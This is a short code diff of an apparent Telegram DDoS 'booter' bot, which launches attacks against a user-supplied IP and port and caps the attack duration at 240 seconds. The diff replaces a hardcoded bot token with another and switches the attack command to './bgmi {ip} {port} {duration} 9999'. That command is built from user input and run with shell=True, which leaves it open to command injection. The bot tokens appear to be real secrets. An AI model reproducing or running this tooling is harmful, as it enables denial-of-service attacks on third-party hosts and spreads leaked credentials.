@@ -7,7 +7,7 @@ from loguru import logger
 
 # === Configuration ===
 OWNER_IDS = [7353797869]  
-BOT_TOKEN = '7616579954:AAGFnjI6FUk29E3oopEDWtxyPlsjF1ZXPzk'  # Your bot token
+BOT_TOKEN = '7616579954:AAGGOO-4Iop81UFEchAVg4h9DvquMRf4J_U'  # Your bot token
 CONFIG_FILE = 'config.json'
 MAX_DURATION = 240  # Max attack duration in seconds
 
@@ -55,7 +55,7 @@ def run_attack(chat_id, ip, port, duration):
     """Executes the attack command and notifies when done."""
     global attack_in_progress, current_target_ip
     try:
-        cmd = f"./lol {ip} {port} {duration} "
+        cmd = f"./bgmi {ip} {port} {duration} 9999 "
         logger.info(f"Starting attack: {cmd}")
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         out, err = proc.communicate()
